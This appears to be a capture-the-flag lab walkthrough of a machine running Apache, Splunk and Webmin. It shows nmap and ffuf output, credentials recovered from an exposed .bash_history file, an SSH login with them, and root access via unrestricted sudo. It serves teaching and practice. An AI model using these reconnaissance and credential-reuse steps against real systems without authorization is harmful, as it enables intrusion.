<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.150.150.222 -p- -T4 -v

```
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 16:04 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Initiating Ping Scan at 16:04
Scanning 10.150.150.222 [2 ports]
Completed Ping Scan at 16:04, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:04
Completed Parallel DNS resolution of 1 host. at 16:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:04
Scanning 10.150.150.222 [4 ports]
Discovered open port 80/tcp on 10.150.150.222
Discovered open port 22/tcp on 10.150.150.222
Discovered open port 8089/tcp on 10.150.150.222
Discovered open port 10000/tcp on 10.150.150.222
Completed Connect Scan at 16:04, 0.19s elapsed (4 total ports)
Initiating Service scan at 16:04
Scanning 4 services on 10.150.150.222
Completed Service scan at 16:04, 38.65s elapsed (4 services on 1 host)
NSE: Script scanning 10.150.150.222.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:04
NSE Timing: About 99.82% done; ETC: 16:05 (0:00:00 remaining)
Completed NSE at 16:05, 31.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:05
Completed NSE at 16:05, 2.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
Nmap scan report for 10.150.150.222
Host is up, received syn-ack (0.30s latency).
Scanned at 2023-02-28 16:04:16 WAT for 73s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af5659c59adef4a9b78f344ba2212471 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWOkjeBO81lDdS9LSAeBGaGEdk54Vd43p4bUnVYrlpQiaOTzGirSw4mQ/qe3AQhPe0SbVVwbGUviGoUwAm+vQb0c4ftVO4yoiYed3bhlPU1hYZckvWRQKBKXTLWchAduFQrr5I5IP+Szv/fT6qS+AgFnqYPNxuy/rq+o7xIZtvU/0Ywdi8+Hc3Mt0KRt6gXCRQaVD+hs72P7QdKGwSJb0BYq8VrtthOlREmXJxXhzd/b5vJC9Hvk0acyi+PPJ5V2wtcCBRPYlJN60AnwIZg9dCWd13j/u443cQgo6vNwic/GFLVbGpHgUxF26eFfIp2WTOqKSc+9Tx4glYtuA6UGgZ
|   256 1be816d4dca67a3e5d6ff2955a59089a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI/XrJHI8tiMKZXByg7tDWxxcIoU/2lj2Ep7fNz6bMmhVbTk+CF+0JbtODLrkjgY85kFI6gOaNlyHpL7LqduNVI=
|   256 9c35dddaeea9b40b556845fd8f853530 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDWG4Ux/9+fLX9MAfMdYScDD1n4aFClL0TIfOxC6Y7YB
80/tcp    open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home Page
|_http-favicon: Unknown favicon MD5: 643D3106699AA425269DBE0BB7768440
| http-methods: 
|_  Supported Methods: GET HEAD POST
8089/tcp  open  ssl/http syn-ack Splunkd httpd
|_http-title: splunkd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-10-25T09:19:54
| Not valid after:  2022-10-24T09:19:54
| MD5:   536bfb1f1fc1e54d822fb12d650d734a
| SHA-1: e879222739ad966faa5b26a14701cef006b52a5c
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCv/lyPj1H5ODANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTEwMjUwOTE5NTRaFw0yMjEwMjQwOTE5
| NTRaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuuwV
| VQ78S3P5GqntN4206LtdojOQwWiXbA0fUZhaxtDb5lBSHid3RNVpPSw9FtLSR8oy
| 2nNmTlKdOYmJBSwjxAJLTBFYlJR+xt0KjWg+yip2ypqBJUfPP/JppysGPusoeby7
| vFrsStR8SQCzqeYcTB67nHvOJ7/xNNT88LeAsESvvA/QGk3PpKMds5HxF3SH2hpr
| tJVcoBGaRdhEIMAyVV1jEU1s7R/LblrB0i0pLi2auFMGi4DWDKQ1KjtQ9jjzLQzX
| O/Ak5nhelIThBHbHpmaj6mbX0087jEzVxSof+9vGvFORp8gjC6KmC0bTMkeW8kKr
| eJOvseMwza7xIdG8XQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCacXxRoPv47ws8
| 6KabFkE0JySrtbJ0lO6vl4MGwvqTUOAhp8mHIpIrNArNaz71FXWnAw6eKFOZoMEJ
| abrc5o5WZVxVUnvdOQ2QZvZnMeJpDXWjbGj7Mlv4UtQ2oCRH3DIo0jWZYofJYfCh
| ByRhcbTFgNomEUM/s9OlsaZxUO7J3uUCl02NoftuZRzYUvcDkQUrdsmAEl62QY/4
| 2RdT3sC5yYd989uqAlr+MlD1XZgg+pBaXvRIKhm5ou2KEQEsqmjmBj4WgQ3FjACh
| Ry9e9p5AZWRTsbgoQ7EvRzuXgc7Rdk4BWgCnPh1ws+d6VpuyY3ybTeNgBQ1ql9bq
| gfvNQkty
|_-----END CERTIFICATE-----
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
10000/tcp open  http     syn-ack MiniServ 1.941 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 7EFDCFA0F0F7B6D238CC297C038144D4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.69 seconds
```
So, we have 4 opened ports here. Port 22 which runs ssh, port 80,8089,10000 which runs http. Our enumeration will start from port 80.



<h2>Enumeration Port 80</h2>

Going to the webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222944375-fe9bc4a2-8106-4333-bcaa-5b063ad27df2.png)

Alright, so this is a shopping webserver that contains movies and their prices. Lets go ahead and fire up ffuf fo fuzz for hidden directories

>command: ffuf -u "http://10.150.150.222/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://10.150.150.222/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.150.150.222/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 82789, Words: 35702, Lines: 1100, 
.cache                  [Status: 301, Size: 317, Words: 20, Lines: 10, 
.bash_history           [Status: 200, Size: 2235, Words: 176, Lines: 72,
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, 
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, 
0                       [Status: 200, Size: 82786, Words: 35702, Lines: 1100,
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1,
catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1,
checkout                [Status: 302, Size: 0, Words: 1, Lines: 1,
cms                     [Status: 200, Size: 0, Words: 1, Lines: 1,
contact                 [Status: 200, Size: 0, Words: 1, Lines: 1,
home                    [Status: 200, Size: 80260, Words: 34836, Lines: 1054, 
Home                    [Status: 301, Size: 0, Words: 1, Lines: 1,
index.php               [Status: 200, Size: 82798, Words: 35702, Lines: 1100, 
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1,
pub                     [Status: 301, Size: 314, Words: 20, Lines: 10,
robots.txt              [Status: 200, Size: 1, Words: 1, Lines: 2,
robots                  [Status: 200, Size: 1, Words: 1, Lines: 2,
:: Progress: [32298/32298] :: Job [1/1] :: 1 req/sec :: Duration: [2:34:33] :: Errors: 7954 ::
```
so we got lots of directories, but the one that interests me the most is the ".bash_history" 

><font color="green">In Linux, the `.bash_history` file is a hidden file that stores a history of the commands that have been executed in the Bash shell, it is always located in the user's home directory</font>

So, lets see if we can find anything interesting in that directory

![image](https://user-images.githubusercontent.com/67879936/222944553-8929017d-ea44-44cc-8ec7-24dcc4e856cc.png)
![image](https://user-images.githubusercontent.com/67879936/222944618-60472785-f4f6-4f9b-89f5-c91f2c590654.png)

So, we found our first flag. If you take a look at the screenshot above you find out that we have a username and a password. Since we have ssh opened on this machine we can go ahead and test those credentials for ssh access

```username:vega```          ```password:puplfiction1994```

>command: ssh vega@10.150.150.222

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ssh vega@10.150.150.222       
vega@10.150.150.222's password: 
Permission denied, please try again.
vega@10.150.150.222's password: 
Permission denied, please try again.
vega@10.150.150.222's password: 
vega@10.150.150.222: Permission denied (publickey,password).
```
Alright so for some reasons the password is not working, I looked around the webpage and I found this

![image](https://user-images.githubusercontent.com/67879936/222944748-4892216e-f53c-403c-9233-f4b5e29519a5.png)

So the first password we saw "puplifiction1994" has the wrong spelling, it should be "pulpfiction1994". Lets  go ahead and try again

```username:vega```               ```password:pulpfiction1994```

![image](https://user-images.githubusercontent.com/67879936/222944769-9b788827-31ca-4b6b-baad-eabbc45aeb12.png)

We got the user shell already, A flag was found in the user's directory _/home/vega_

![image](https://user-images.githubusercontent.com/67879936/222945099-d32aa3f0-f8f1-4d9a-93dc-f15a057f3a7c.png)

Lets go ahead and escalate our privileges



<h2>Privilege Escalation</h2>

checking sudo's right

>command: sudo -l

![image](https://user-images.githubusercontent.com/67879936/222944881-15e6a30f-3338-41d1-ac06-b00cc6a9ac47.png)

We can see that user "vega" can run all commands as root. Lets go ahead and become the root user

>command: sudo /bin/bash

![image](https://user-images.githubusercontent.com/67879936/222944893-c1aa1400-bd00-452e-a3cf-bb909c8be4e2.png)

Boom!!! We got a shell as the root user. A flag was found in the _/root_ directory

![image](https://user-images.githubusercontent.com/67879936/222945071-85ee2d8d-1bad-4eb1-a6d7-3c8df82a3b91.png)

That will be all for today
<br> <br>
[Back To Home](../../index.md)

















